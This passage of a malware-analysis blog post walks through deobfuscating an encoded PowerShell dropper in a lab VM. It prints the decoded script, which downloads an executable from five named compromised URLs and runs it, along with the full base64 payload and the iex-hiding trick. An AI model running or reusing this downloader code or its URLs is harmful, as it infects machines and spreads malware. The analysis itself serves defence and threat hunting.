href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()&amp;amp;input=TGdBZ0FDZ0FJQUFrQUZBQWN3QklBRzhBVFFCbEFGc0FOQUJkQUNzQUpBQlFBSE1BYUFCUEFHMEFSUUJiQURNQU1BQmRBQ3NBSndCWUFDY0FLUUFvQUc0QVJRQlhBQzBBYndCaUFFb0FaUUJqQUZRQUlBQkpBRzhBTGdCREFFOEFiUUJ3QUZJQVJRQlRBRk1BU1FCUEFHNEFMZ0JFQUdVQVpnQk1BRUVBZEFCRkFITUFWQUJ5QUVVQVFRQnRBQ2dBV3dCcEFHOEFMZ0JOQUVVQWJRQlBBRklBV1FCVEFIUUFjZ0JGQUdFQWJRQmRBRnNBY3dCWkFGTUFWQUJGQUUwQUxnQmpBRzhBYmdCV0FHVUFVZ0IwQUYwQU9nQTZBRVlBY2dCdkFFMEFZZ0JCQUhNQVpRQTJBRFFBVXdCMEFISUFhUUJ1QUVjQUtBQW9BQ2NBVmdCYUFDY0FLd0FuQUVJQVpBQmhBRGtBY3dCM0FFWUFKd0FyQUNjQVNRQmlBQzhBYVFCcEFEUUFUUUJUQUhNQWFBQnpBSG9BSndBckFDY0FOZ0IwQUdnQWNBQW5BQ3NBSndCakFHSUFVUUJKQUNjQUt3QW5BRFFBZFFCSEFGRUFUZ0JyQUhjQVNRQlVBRkVBSndBckFDY0FUZ0FuQUNzQUp3Qm5BRElBUVFBbkFDc0FKd0J5QUVvQU5RQkdBR2tBVndCNkFFc0FUd0JGQUhFQVpRQkZBQ2NBS3dBbkFDOEFVQUFuQUNzQUp3Qm1BQ2NBS3dBbkFFb0FKd0FyQUNjQVZ3QTVBSEFBZFFCMUFHZ0FWQUJRQUdVQVlnQXJBQ2NBS3dBbkFEZ0FKd0FyQUNjQVNBQk9BQ2NBS3dBbkFHY0FhUUJCQURnQWFBQlRBQ3NBYUFCUEFHMEFTQUJIQUVzQVlRQmxBQ2NBS3dBbkFFRUFjZ0JYQUhvQVVBQW5BQ3NBSndCQ0FGVUFXUUFyQUNzQVlnQW5BQ3NBSndCakFHOEFMd0JEQUdzQWFBQTVBRzhBWndCNEFHTUFjd0FuQUNzQUp3QnpBQ2NBS3dBbkFERUFjUUJvQUhRQUp3QXJBQ2NBWndCUUFHY0FWQUJ1QUdjQUp3QXJBQ2NBUlFBbkFDc0FKd0JMQUZvQUp3QXJBQ2NBV0FCWEFDY0FLd0FuQUhRQWJ3QmxBQ2NBS3dBbkFFZ0FUUUFuQUNzQUp3Qk1BRk1BZVFBd0FFd0FTd0JXQUNjQUt3QW5BSGdBYmdCaUFFc0FlUUJ4QUUwQVNRQm9BQ2NBS3dBbkFFY0FKd0FyQUNjQWJnQkRBQ2NBS3dBbkFIWUFkZ0JYQUV3QVZBQmhBQ2NBS3dBbkFFNEFNQUJsQUVZQVl3QXJBR2dBSndBckFDY0FOQUF2QUhZQVdnQk9BQzhBTXdCM0FGVUFKd0FyQUNjQU53QXdBREFBY0FCbkFDY0FLd0FuQUZjQUp3QXJBQ2NBT0FCUkFEZ0FKd0FyQUNjQWJnQmtBSE1BYndCMkFFZ0FWd0JoQUNjQUt3QW5BQzhBTXdCWUFEa0FKd0FyQUNjQWFRQldBR2tBY0FCa0FHRUFWZ0FuQUNzQUp3QlZBRVlBSndBckFDY0Fid0JvQUdrQUp3QXJBQ2NBUlFCc0FFSUFZZ0F4QUdNQVdRQlBBRWdBT0FCUEFHNEFNUUFuQUNzQUp3QnFBSFlBTVFCRUFFc0FKd0FyQUNjQVpnQXlBRElBSndBckFDY0FUUUJpQURJQWRRQW5BQ3NBSndCVUFHSUFSUUJLQUU0QVRnQndBQ2NBS3dBbkFGQUFKd0FyQUNjQWVnQTJBR2tBVEFCdkFEY0FMd0JqQUNjQUt3QW5BR2NBU0FCV0FFOEFjQUJ6QUZnQWRRQTBBRkFBZWdBbkFDc0FKd0JEQUNjQUt3QW5BRGdBT1FBMEFEQUFlQUFuQUNzQUp3Qm1BREFBY0FBekFFb0FZd0JvQUVRQVpRQmFBSFFBY2dCbEFIa0FTUUJRQUhRQVNnQjRBRFFBYWdBbkFDc0FKd0JWQUhjQUp3QXJBQ2NBYUFCV0FGVUFaZ0JNQUZZQVRnQmhBR01BUkFCbkFDY0FLd0FuQUVRQWRRQkRBRllBZVFCeEFFY0FRUUJDQUVvQUp3QXJBQ2NBUXdCVkFEQUFLd0JxQUNjQUt3QW5BRFFBY3dCQkFEVUFKd0FyQUNjQWR3QkVBRm9BSndBckFDY0FPQUFuQUNzQUp3QjNBR2dBZWdBckFHUUFKd0FyQUNjQVZnQnNBRU1BT0FCcEFEa0FlZ0JrQUNjQUt3QW5BRzRBUVFBbkFDc0FKd0JRQUdzQWNRQTVBRllBUXdCbUFDY0FLd0FuQUVnQWJ3QTBBRWdBTndCT0FISUFUd0JpQUNjQUt3QW5BRVlBVndCT0FFVUFKd0FyQUNjQUx3QnhBRXdBSndBckFDY0FWQUFuQUNzQUp3QnRBRFFBUXdCRkFIZ0FjZ0JuQUVjQVZ3QW5BQ3NBSndCdEFIa0FUZ0JTQUNjQUt3QW5BREFBVndCUkFHOEFOZ0E0QURVQVZBQktBR1lBUndBbkFDc0FKd0JWQUdFQVZRQktBR2dBT1FCaUFHb0FKd0FyQUNjQWFRQXJBRElBWlFBbkFDc0FKd0EzQUNjQUt3QW5BSFlBWXdCMEFHY0FMd0FuQUNzQUp3QTBBQ2NBS3dBbkFISUFKd0FyQUNjQVpBQlRBRlFBVlFBekFISUFTQUFuQUNzQUp3QjJBRFVBUXdCaUFHd0FPQUIwQUNjQUt3QW5BRFlBWXdBbkFDc0FKd0J4QUNjQUt3QW5BRzhBT1FCUkFFb0FlZ0JUQUV3QVRRQW5BQ3NBSndCMUFHTUFRd0JWQURFQWJRQlhBQ2NBS3dBbkFIb0FKd0FyQUNjQVNRQmhBQ2NBS3dBbkFGUUFaQUJJQUNjQUt3QW5BRFlBSndBckFDY0FUUUEwQUhZQVRnQkNBQ2NBS3dBbkFIZ0FKd0FyQUNjQWJnQlZBSEVBSndBckFDY0FTQUJrQUZjQVJRQnVBQ3NBU0FCS0FDY0FLd0FuQUZBQU53QnhBRE1BY0FCb0FDY0FLd0FuQUdNQUp3QXJBQ2NBV2dBbkFDc0FKd0IyQUhBQUp3QXJBQ2NBYXdBbkFDc0FKd0JMQUhZQWVRQW5BQ3NBSndCUUFDY0FLd0FuQUdNQUt3QlZBRm9BUndCNkFIRUFiZ0JzQUNjQUt3QW5BRXdBYXdCM0FDY0FLd0FuQUdFQU1BQmhBQ2NBS3dBbkFGUUFKd0FyQUNjQU1BQnJBQ2NBS3dBbkFGY0FkQUFuQUNzQUp3QnJBSFVBZEFBbkFDc0FKd0JXQUVZQVJnQmlBRWtBSndBckFDY0FlUUFuQUNzQUp3QXZBRmdBY1FCNkFGY0FUZ0FuQUNzQUp3QjFBRmtBUXdCd0FGTUFNZ0FuQUNzQUp3QnhBRFlBYWdBekFHd0FNUUI0QUcwQUp3QXJBQ2NBZGdCM0FDY0FLd0FuQUVjQUp3QXBBQ2tBSUFBc0FDQUFXd0JwQUU4QUxnQmpBRThBVFFCUUFISUFSUUJUQUhNQWFRQlBBRzRBTGdCREFFOEFiUUJ3QUhJQVpRQnpBSE1BYVFCdkFHNEFUUUJ2QUVRQVpRQmRBRG9BT2dCRUFHVUFZd0JQQUUwQWNBQlNBRVVBY3dCVEFDa0FmQUJtQUc4QWNnQkZBR0VBUXdCSUFIc0FJQUJ1QUVVQVZ3QXRBRzhBWWdCS0FHVUFZd0JVQUNBQUlBQnBBRThBTGdCekFIUUFVZ0JsQUVFQVRRQlNBRVVBWVFCa0FFVUFVZ0FvQUNBQUpBQmZBQ0FBTEFBZ0FGc0Fjd0I1QUZNQWRBQmxBRTBBTGdCVUFHVUFlQUJVQUM0QVJRQnVBR01BVHdCa0FHa0FUZ0JuQUYwQU9nQTZBRUVBVXdCREFFa0FTUUFwQUNBQWZRQWdBSHdBSUFCR0FHOEFjZ0JsQUVFQVF3QklBSHNBSUFBa0FGOEFMZ0JTQUdVQVlRQkVBRlFBYndCbEFFNEFaQUFvQUNrQWZRQXBBQT09&quot;&gt;CyberChef&lt;/a&gt; (another favorite tool) as seen below, but first remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -e&lt;/code&gt; command to work with the raw base64. Once decoded we see that there is a period preceding the rest of the code, which is a Call Operator. This essentially runs code from another script or function.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/cyberchef-base64.png&quot; alt=&quot;CyberChef base64&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What this Call Operator runs is an obfuscation trick to hide the command “iex”, which is an alias for Invoke-Expression.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PsHoMe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PshOmE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The trick is they sliced letters from the output of the $pshome variable, which normally outputs the full path to PowerShell, and appended an X forming the word &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ieX&lt;/code&gt; when it’s concatenated.&lt;/p&gt;

&lt;h1 id=&quot;deflate-memory-stream&quot;&gt;Deflate Memory Stream&lt;/h1&gt;

&lt;p&gt;The expression to be executed which follows contains statements about deflating a memory stream, which means the best way to handle this is to let PowerShell do the work for us. We just have to de-fang the code so it won’t actually run and infect us. &lt;em&gt;You are using a lab VM with the network disabled and a snapshot already completed, aren’t you?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;First, remove the period at the beginning and the ($PsHoMe[4]+$PshOmE[30]+’X’). You should be left with the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;nEW-obJecT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Io.COmpRESSIOn.DefLAtEsTrEAm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;io.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;MEmORYStrEam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;sYSTEM.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;conVeRt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FroMbAse64StrinG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'VZBda9swFIb/ii4MSshsz6thpcbQI4uGQNkwITQNg2ArJ5FiWzKOEqeE/PfJW9puuhTPeb+8HNgiA8hS+hOmHGKaeArWzPBUY++bco/Ckh9ogxcss1qhtgPgTngEKZXWtoeHMLSy0LKVxnbKyqMIhGnCvvWLTaN0eFc+h4/vZN/3wU700pgW8Q8ndsovHWa/3X9iVipdaVUFohiElBb1cYOH8On1jv1DKf22Mb2uTbEJNNpPz6iLo7/cgHVOpsXu4PzC8940xf0p3JchDeZtreyIPtJx4jUwhVUfLVNacDgDuCVyqGABJCU0+j4sA5wDZ8whz+dVlC8i9zdnAPkq9VCfHo4H7NrObFWNE/qLTm4CExrgGWmyNR0WQo685TJfGUaUJh9bji+2e7vctg/4rdSTU3rHv5Cbl8t6cqo9QJzSLMucCU1mWzIaTdH6M4vNBxnUqHdWEn+HJP7q3phcZvpkKvyPc+UZGzqnlLkwa0aT0kWtkutVFFbIy/XqzWNuYCpS2q6j3l1xmvwG'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;iO.cOMPrESsiOn.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;COmpressionMoDe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DecOMpREsS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;forEaCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;nEW-obJecT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iO.stReAMREadER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;sySteM.TexT.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;EncOdiNg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;ForeACH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReaDToeNd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()})&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you copy the command above string and paste it into a PowerShell prompt, the deflate memory strem functions will run and you get this output (output highlighted):&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/ps-code-run.png&quot; alt=&quot;PowerShell code run&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;clean-upformat-code&quot;&gt;Clean Up/Format Code&lt;/h1&gt;

&lt;p&gt;Again, we could stop here and pull out the clear-text URLs which can be blocked and/or hunted for in your network. However, there is still more we can pull from this code. You may already see it if you have a sharp eye, but to make the code more readable let’s replace all the semicolons with carriage return characters (\r\n). You can do this with a using regex find/replace functions found in more advanced text editors like Notepad++ or just use CyberChef. Now the code should look like this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$QABUCAAC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'OAGDA4'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new-object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mAGAZw1X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'aDAxAA'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'174'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ADDADBBX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'LxZ1QU1'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;userprofile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.exe'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vAUAwAA4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'CCCQAk'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ge&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mBBAxAA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'BAD1_B'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$S4DoAGc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'p_1wBAAD'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A quick review of the code will show there are some variables set that are garbage, never used elsewhere. With Notepad++ I found if I double-click to highlight each of the variables, it will also highlight other places it is called. So any variable name that isn’t called is useless and can be removed. But you can also manually review the code and remove any variables that are junk. So let’s remove those and get to this point:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new-object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'174'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;userprofile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.exe'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ge&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You may be able to read the code just fine from this point, however here’s a beautified version with indents to properly nest operations:&lt;/p&gt;

